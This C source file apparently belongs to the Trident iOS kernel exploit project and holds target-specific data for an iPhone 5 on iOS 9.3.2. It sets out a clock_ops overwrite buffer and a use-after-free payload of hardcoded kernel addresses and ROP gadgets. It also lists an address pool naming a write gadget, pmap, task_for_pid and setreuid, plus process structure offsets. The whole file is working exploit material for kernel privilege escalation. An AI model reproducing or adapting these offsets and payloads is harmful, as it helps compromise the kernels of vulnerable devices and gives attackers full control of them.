//
//  target_iphone_5_3_ios_9_3_2.c
//  Trident
//
//  Created by Karen Tsai on 12/14/16.
//  Copyright © 2016 Benjamin Randazzo. All rights reserved.
//

#include "target_iphone_5_3_ios_9_3_2.h"

static uint8_t clock_ops_overwrite[] = {
	0x59, 0xef, 0x31, 0x00, // [00] (rtclock.getattr): address of OSSerializer::serialize (+1)
	0x00, 0x00, 0x00, 0x00, // [04] (calend_config): NULL
	0x00, 0x00, 0x00, 0x00, // [08] (calend_init): NULL
	0x71, 0xe1, 0x01, 0x00, // [0C] (calend_gettime): address of calend_gettime (+1)
	0x6d, 0xee, 0x0d, 0x00, // [10] (calend_getattr): address of _bufattr_cpx (+1)
};

static uint8_t uaf_payload_buffer[] = {
	0x00, 0x00, 0x00, 0x00, // [00] ptr to clock_ops_overwrite buffer
	0x28, 0xb4, 0x40, 0x00, // [04] address of clock_ops array in kern memory
	0xdc, 0xb7, 0x0c, 0x00, // [08] address of _copyin
	0x00, 0x00, 0x00, 0x00, // [0C] NULL
	0x59, 0xef, 0x31, 0x00, // [10] address of OSSerializer::serialize (+1)
	0x4a, 0xea, 0x0d, 0x00, // [14] address of "BX LR" code fragment
	0x00, 0x00, 0x00, 0x00, // [18] NULL
	0x19, 0x28, 0x32, 0x00, // [1C] address of OSSymbol::getMetaClass (+1)
	0x4a, 0xea, 0x0d, 0x00, // [20] address of "BX LR" code fragment
	0x4a, 0xea, 0x0d, 0x00, // [24] address of "BX LR" code fragment
};

static uint32_t addresses_pool[] = {
	0x000cb508, // WRITE_GADGET // address of "str r1, [r0, #0xc] ; bx lr"
	0x003fe454, // PMAP
	0x000bf274, // FLUSH_DCACHE
	0x000cb560, // INVALIDATE_TLB
	0x00302df0, // TFP
	0x002af5f8, // SETREUID
	0x0031ef59, // SERIALIZE
	0x0045d97c, // ADDRPERM
};

static uint32_t check_offsets_pool[] = {
	0x14, // PID
	0x3e, // POSIX
	0x1e6, // MAC_PROC
};

void target_iphone_5_3_ios_9_3_2_init(target_t *t)
{
	t->clock_ops_overwrite = clock_ops_overwrite;
	t->clock_ops_overwrite_size = sizeof(clock_ops_overwrite);
	
	t->uaf_payload_buffer = uaf_payload_buffer;
	t->uaf_payload_buffer_size = sizeof(uaf_payload_buffer);
	
	t->addresses_pool = addresses_pool;
	t->check_offsets_pool = check_offsets_pool;
}
